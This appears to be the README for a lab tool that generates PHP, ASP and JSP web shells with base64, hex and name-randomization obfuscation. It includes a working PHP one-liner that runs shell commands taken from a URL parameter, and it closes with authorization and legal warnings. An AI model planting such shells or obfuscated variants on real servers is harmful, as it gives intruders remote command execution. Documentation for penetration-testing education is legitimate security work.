# WEB10 — Web Shell Generator (Lab)

Educational PHP/ASP/JSP web shell payload generator for authorized lab testing.

## Overview

- Generates web shell payloads across three languages: PHP, ASP, and JSP
- Payload categories: command execution, file read/write, reverse shell stubs, info disclosure
- Obfuscation options: base64 encoding, hex encoding, variable-name randomization
- Outputs text files with metadata headers and an HTML report of all artifacts
- Works entirely offline — no network targets required for demo mode

## Features

- **Multi-language payloads**: PHP, ASP, JSP shells across 5 categories
- **Obfuscation engine**: base64, hex, and variable randomization wrappers
- **Payload library**: Curated collection of well-known shell patterns
- **HTML report**: Color-coded artifact report with severity ratings
- **Lab-only output**: Text files written to a temp directory for review
- **Self-contained demo**: Generates 29 sample payloads without any network

## Requirements

- Python 3.8+
- No external dependencies (standard library only)

## Usage

```bash
# Run demo mode (generates payloads to temp dir, prints summary)
python3 firmware/webshell_gen.py

# Use programmatically
from firmware.webshell_gen import WebShellGenerator

gen = WebShellGenerator(output_dir="./shells")
gen.generate(languages=["php"], categories=["command_exec"], obfuscation=["base64"])
gen.generate_html_report()
gen.print_summary()
```

## Example Output

```
================================================================
  WEB10 — Web Shell Generator (Lab) — Demo Mode
================================================================

[*] Available payload library:
  [PHP]
    command_exec: Execute system commands via shell_exec / passthru (5 payloads, severity=CRITICAL)
    file_read: Read arbitrary files from the server filesystem (4 payloads, severity=HIGH)
    file_write: Write arbitrary files to the server filesystem (2 payloads, severity=CRITICAL)
    ...
  [ASP]
    command_exec: Execute commands via WScript.Shell (2 payloads, severity=CRITICAL)
    ...
  [JSP]
    command_exec: Execute commands via Runtime.getRuntime().exec() (2 payloads, severity=CRITICAL)
    ...

[*] Generating payloads (all languages, all categories, no obfuscation)...
  Total artifacts:  29

[*] Sample payload (PHP command_exec #1):
    // WEB10 Lab Payload Generator
    // Language: PHP
    // Category: command_exec
    // Severity: CRITICAL
    // ------------------------------------------------------------
    <?php echo shell_exec($_GET["cmd"]); ?>

[*] Generating with obfuscation (base64 + hex)...
  Generated 9 obfuscated payloads
```

## IMPORTANT: Read before use.

### Authorization Requirements
- You MUST have explicit written permission from the network owner before using this tool
- Unauthorized deployment of web shells is illegal under federal and state laws
- This tool should ONLY be used on systems you own or have written authorization to test
- Web shell deployment on production systems without authorization is a criminal offense

### Legal Framework
- **Computer Fraud and Abuse Act (CFAA, 18 U.S.C. § 1030)**: Unauthorized access to computer systems is a federal crime; deploying web shells constitutes unauthorized access
- **State Laws**: Many states have additional computer crime statutes with enhanced penalties
- **Wiretap Act (18 U.S.C. § 2511)**: Reverse shells that intercept communications may violate wiretap laws

### Acceptable Use
- Testing web applications you own or have written authorization to test
- Authorized penetration testing with explicit scope including web shell deployment
- Academic research in controlled lab environments
- Security education and training exercises on your own infrastructure

### Prohibited Use
- Deploying web shells on any system without explicit authorization
- Using generated payloads against third-party infrastructure
- Any activity that violates applicable laws or regulations
- Commercial use without proper licensing

### No Warranty
This software is provided "AS IS" without warranty of any kind. The author is not responsible for any misuse or damage caused by this software. All payloads are provided for educational purposes only.

### Responsible Disclosure
If you discover web shell vulnerabilities during testing:
1. Report to the vendor/site owner privately
2. Allow reasonable time for remediation before any public disclosure
3. Do not deploy actual web shells beyond minimal proof of concept
4. Document findings for the security report

## License

MIT
